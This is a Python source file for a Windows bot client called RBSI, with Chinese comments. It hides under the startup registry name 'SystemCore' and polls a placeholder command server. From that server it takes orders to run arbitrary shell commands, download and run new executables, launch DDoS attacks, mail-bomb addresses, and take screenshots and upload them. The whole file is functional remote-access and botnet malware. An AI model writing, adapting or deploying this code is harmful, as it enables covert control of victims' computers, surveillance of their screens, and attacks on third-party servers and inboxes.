# 该文件自定义：更改35行URL的值

import requests
from socket import gethostname
import subprocess
import sys
import time
import uuid
import win32api
import win32con
import random
import pyautogui  # pip install pyautogui==0.9.50
import zmail
import threading

import DDOS


class CmdTread(threading.Thread):
    def __init__(self, cmdL):
        super(CmdTread, self).__init__()
        self.cmd = cmdL
        self.start()

    def run(self):
        subprocess.call(self.cmd,
                        shell=True,
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE)


# 全局变量初始化
version = 1
url = "http://YOUR_SERVER_HOST:YOUR_SERVER_PORT/"

# 开机启动
exePath = sys.argv[0]
key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER,
                          "Software\Microsoft\Windows\CurrentVersion\Run", 0,
                          win32con.KEY_WRITE)
win32api.RegSetValueEx(key, "SystemCore", 0, win32con.REG_SZ, exePath)


def send_mail(from_address,
              from_password,
              to_address,
              title="RBSI发送的问候",
              content="这是来自RBSI程序发送的问候。",
              from_name="RBSI"):
    # 邮件轰炸函数
    mail_content = {
        "subject":
        title,
        "content_html":
        "<p>%s</p><br /><p>本次发信识别码：%s %s</p>" %
        (content, random.random(), time.time()),
        "from":
        "%s <%s>" % (from_name, from_address)
    }

    server = zmail.server(from_address, from_password)
    try:
        server.send_mail([to_address], mail_content)
        return True
    except:
        return False


def init():
    # 初始化与服务端的通讯
    global action
    succeed = False
    action = -1
    while not succeed:
        try:
            r = requests.post(url + "init", data={"name": name}).json()
            if r["version"] > version:
                # 有更新，进行检测
                print("检查到更新，开始下载...")
                try:
                    new_version = r["version"]
                    download_address = r["download_address"]
                    r = requests.get(download_address)
                    exe_name = exePath.split("/" if "/" in exePath else "\\")[
                        -1].split("-")[0] + "-" + str(new_version) + ".exe"
                    with open(exe_name, "wb") as f:
                        f.write(r.content)
                    # 设置注册表，方便新版本删除旧版本
                    _key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER,
                                               r"Software", 0,
                                               win32con.KEY_WRITE)
                    win32api.RegSetValueEx(_key, "RBSI-old", 0,
                                           win32con.REG_SZ, exePath)
                    subprocess.call("/".join(
                        exePath.split("/" if "/" in exePath else "\\")[:-1]) +
                                    "/" + exe_name,
                                    shell=True,
                                    stdin=subprocess.PIPE,
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE)
                    raise SystemExit
                except SystemExit:
                    raise SystemExit
                except:
                    print("检测到新版本，但是更新失败。")
            action = r["action"]
            print("服务器通讯初始化成功！")
            send_message("初始化成功！")
            succeed = True
        except SystemExit:
            raise SystemExit
        except:
            print("服务器通讯初始化失败！15秒后重新尝试...")
            time.sleep(15)


def send_message(message):
    requests.post(url + "message", data={"name": name, "message": message})


mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
mac = "-".join([mac[e:e + 2] for e in range(0, 11, 2)])
name = gethostname() + "_" + mac
print("当前设备名称：" + name)

action = -1
init()

while True:
    try:
        while True:
            data = {"name": name, "action": action}
            response = requests.post(url + "connect", data=data)
            response = response.json()
            print(response)

            waited = False

            if response.get("stop-once"):
                send_message("stop-once执行")
                raise SystemExit
            if response.get("stop-forever"):
                send_message("stop-forever执行")
                key = win32api.RegOpenKey(
                    win32con.HKEY_CURRENT_USER,
                    "Software\Microsoft\Windows\CurrentVersion\Run", 0,
                    win32con.KEY_WRITE)
                win32api.RegSetValueEx(key, "SystemCore", 0, win32con.REG_SZ,
                                       "")
                raise SystemExit

            if response.get("show-version"):
                send_message("展示版本执行...")
                CmdTread(
                    "mshta vbscript:msgbox(\"当前版本：%s\",64,\"RBSI版本\")(window.close)"
                    % version)
                send_message("展示版本成功!")
                waited = True

            action = response["action"]
            if response["actions"]:
                send_message("开始执行命令...")
                for i in response["actions"]:
                    if "all" not in i["send_to"] and name not in i["send_to"]:
                        continue
                    CmdTread(i["command"])
                send_message("命令执行成功！")
                waited = True

            if response["DDOS"]["do"]:
                DDOS.run(times=response["DDOS"]["times"],
                         host=response["DDOS"]["host"],
                         page=response["DDOS"]["page"],
                         port=response["DDOS"]["port"])
                send_message("DDOS线程启动")

            if response["mail-attack"]["do"]:
                if response["mail-attack"]["easy"]:
                    for i in range(response["mail-attack"]["times"]):
                        send_mail(
                            from_address=response["mail-attack"]
                            ["from-address"],
                            from_password=response["mail-attack"]
                            ["from-password"],
                            to_address=response["mail-attack"]["to-address"])
                else:
                    for i in range(response["mail-attack"]["times"]):
                        send_mail(
                            from_address=response["mail-attack"]
                            ["from-address"],
                            from_password=response["mail-attack"]
                            ["from-password"],
                            to_address=response["mail-attack"]["to-address"],
                            from_name=response["mail-attack"]["from-name"],
                            title=response["mail-attack"]["title"],
                            content=response["mail-attack"]["content"])
                raise KeyboardInterrupt
            
            if response.get("getScreen"):
                send_message("尝试截图...")
                pyautogui.screenshot("Screenshot.png")
                requests.post(url + "upload",
                              data={"name": name},
                              files={"file": open("Screenshot.png", "rb")})
                send_message("截图成功！")

            if not waited:
                time.sleep(5)

    except KeyboardInterrupt:
        send_message("邮件轰炸成功发送！")
    except SystemExit:
        send_message("尝试退出...")
        raise SystemExit
    except:
        print("未知错误！程序即将重新初始化...")
        init()
